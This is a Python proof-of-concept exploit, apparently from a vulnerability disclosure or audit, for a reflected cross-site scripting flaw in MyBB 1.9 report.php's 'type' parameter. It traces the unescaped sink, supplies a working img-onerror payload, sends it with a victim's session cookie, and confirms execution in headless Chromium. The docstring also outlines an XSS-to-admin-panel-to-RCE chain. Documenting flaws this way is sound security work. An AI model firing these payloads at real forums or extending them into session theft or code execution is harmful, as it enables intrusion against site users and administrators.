#!/usr/bin/env python3
"""
VULN-002 — Reflected XSS in report.php via the `type` parameter.

Target  : MyBB 1.9.0-alpha.1 (dev-1.9, commit f8bf4e8)
Sink    : targets/mybb/report.php:33 (raw input) -> :128/:253 (sprintf) ->
          inc/themes/core.base/frontend/templates/report/report.twig:15 ({{ report.error|raw }})
Class   : CWE-79 Reflected Cross-Site Scripting

The flaw
--------
report.php copies the request parameter `type` in raw:

    $report_info['type'] = $mybb->get_input('type');            # report.php:33

Any value outside {post, profile, reputation} matches no handler branch, so the
code falls through to an error built with MyBB's i18n primitive:

    $error = $lang->sprintf($lang->error_invalid_report, $report_info['type']); # :128/:253

`MyLanguage::sprintf()` substitutes the argument with a plain str_replace and NO
escaping (inc/class_language.php:192), the language string
`error_invalid_report = "This {1} either does not exist..."` contains the {1}
placeholder, and the template renders the result with Twig's `|raw` filter
(report.twig:15) — so the attacker-controlled `type` lands verbatim in HTML
element-content context and executes in the victim's session.

report.php:19 blocks guests, so the victim must be logged in — but the attacker
needs no account and no CSRF token: it is a single GET link. Against an
administrator victim the script rides the same-origin ACP (/admin/) to reach the
template eval() RCE (SECURITY.md #3689) — the XSS->ACP->RCE chain.

Exploitation idea
-----------------
Lure any logged-in user to  report.php?type=<img src=x onerror=alert(...)>.

What a successful run proves
---------------------------
(1) The payload is reflected UN-escaped into the `|raw` error sink of the page
    actually served to a logged-in victim (HTTP proof), and
(2) a real Chromium browser carrying the victim's session cookie executes the
    injected JavaScript (an alert() dialog fires) when it opens the link.
"""
import os
import subprocess
import sys

# shared helper lives one level up in exploits/
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import mybb_common as m

# ----- colored, file-safe logging (ANSI only on a TTY, honors NO_COLOR) ----- #
_USE_COLOR = sys.stdout.isatty() and not os.environ.get("NO_COLOR")
_C = {"INFO": "36", "SETUP": "33", "STEP": "33", "PROOF": "35", "OK": "32", "FAIL": "31"}


def log(tag, msg):
    if _USE_COLOR and tag in _C:
        print(f"\033[1;{_C[tag]}m[{tag}]\033[0m {msg}")
    else:
        print(f"[{tag}] {msg}")


HERE = os.path.dirname(os.path.abspath(__file__))
BASE_URL = m.BASE_URL

# Unique marker so we can unambiguously find OUR payload in the response, and a
# payload that fires in HTML element-content context. onerror on a broken <img>
# is the most reliable auto-firing vector.
MARKER = "xss" + m.secrets.token_hex(3)
PAYLOAD = f"<img src=x onerror=alert('{MARKER}')>"


def http_proof(victim_cookie):
    """GET the crafted URL as the logged-in victim; prove the payload is reflected
    un-escaped into the report.twig |raw sink."""
    import requests
    log("STEP", f"GET /report.php?type=<payload> as the victim (type = {PAYLOAD!r})")
    # `type` is the only parameter needed for the unknown-type error path.
    r = requests.get(
        f"{BASE_URL}/report.php",
        params={"type": PAYLOAD},
        cookies={"mybbuser": victim_cookie},
        headers={"User-Agent": m.UA},
        timeout=15,
    )
    body = r.text
    # Save raw request/response evidence.
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(
            "GET /report.php?type=%3Cimg%20src%3Dx%20onerror%3Dalert('"
            + MARKER + "')%3E HTTP/1.1\n"
            f"Host: {BASE_URL.split('://')[1]}\n"
            f"Cookie: mybbuser={victim_cookie}\n"
            f"User-Agent: {m.UA}\n\n"
        )
    # Keep a trimmed response snippet around the sink.
    idx = body.find(MARKER)
    snippet = body[max(0, idx - 200):idx + 200] if idx >= 0 else body[:400]
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP/1.1 {r.status_code}\nContent-Type: {r.headers.get('Content-Type')}\n\n")
        f.write("... region around the injected payload in the rendered report page ...\n\n")
        f.write(snippet)

    # The decisive check: our EXACT payload (with '<' and '>' intact, NOT entity
    # encoded) must be present inside the page body. If MyBB had escaped it we
    # would instead see &lt;img ...&gt; and the marker would not sit inside a
    # live tag.
    raw_present = PAYLOAD in body
    escaped = f"&lt;img src=x onerror=alert('{MARKER}')" in body
    log("INFO", f"HTTP {r.status_code}; raw payload present={raw_present}; html-escaped={escaped}")
    if raw_present and not escaped:
        log("PROOF", "payload reflected verbatim inside "
                     "<div class=\"row row--form\">…</div> (report.twig:15 |raw) — "
                     "the '<img onerror>' tag reaches the DOM unescaped")
    return raw_present and not escaped


def browser_proof(victim_cookie):
    """Drive a real Chromium (Playwright container) with the victim's cookie to
    the malicious URL and confirm the injected JS actually executes (alert fires)."""
    # The payload also fires alert(document.domain) and sets window.__xss=MARKER.
    url = (f"{BASE_URL}/report.php?type=%3Cimg%20src%3Dx%20onerror%3D"
           f"alert(document.domain);window.__xss=%27{MARKER}%27%3E")
    log("STEP", "launching headless Chromium (Playwright container) with the victim cookie")
    fired, transcript = m.browser_dialog_check(
        url, mybbuser=victim_cookie,
        screenshot_rel="exploits/VULN-002/evidence/xss_fired.png", marker=MARKER)
    print("    " + transcript.strip().replace("\n", "\n    "))
    if fired:
        log("PROOF", "Chromium executed the injected script: an alert() dialog fired "
                     "in the victim's authenticated session (screenshot in evidence/xss_fired.png)")
        return True
    log("INFO", "browser did not report a dialog; HTTP unescaped-reflection proof stands")
    return False


def main():
    print("=" * 72)
    print("VULN-002: Reflected XSS in report.php?type= (any logged-in victim)")
    print(f"Target: {BASE_URL}")
    print("=" * 72)
    log("INFO", "exercising report.php type-reflection -> report.twig:15 |raw sink")

    # --- precondition: the victim is any logged-in user (report.php blocks guests)
    victim = m.rand("victim_")
    pw = "Vpass!" + m.secrets.token_hex(3)
    log("SETUP", f"creating an ordinary forum user {victim} to act as the lured victim "
                 "(report.php:19 requires a logged-in uid; attacker needs no account)")
    uid = m.create_user(victim, pw)
    c = m.new_session()
    if not m.login(c, victim, pw):
        log("FAIL", "could not log in the victim user")
        return 1
    victim_cookie = c.cookies["mybbuser"]
    log("INFO", f"victim uid={uid}, session cookie obtained")

    ok_http = http_proof(victim_cookie)
    ok_browser = browser_proof(victim_cookie)

    print("-" * 72)
    if ok_http and ok_browser:
        log("OK", "exploit confirmed — payload reflected unescaped AND executed in-browser")
        print("==> VULN-002: CONFIRMED — reflected XSS executes JS in a logged-in victim's session")
        return 0
    if ok_http:
        log("OK", "exploit confirmed — payload reflected unescaped into the |raw HTML sink")
        print("==> VULN-002: CONFIRMED — reflected XSS (payload lands in executable HTML context)")
        return 0
    log("FAIL", "payload was not reflected unescaped — sink may be patched/escaped")
    print("==> VULN-002: FAILED — no unescaped reflection observed")
    return 1


if __name__ == "__main__":
    sys.exit(main())
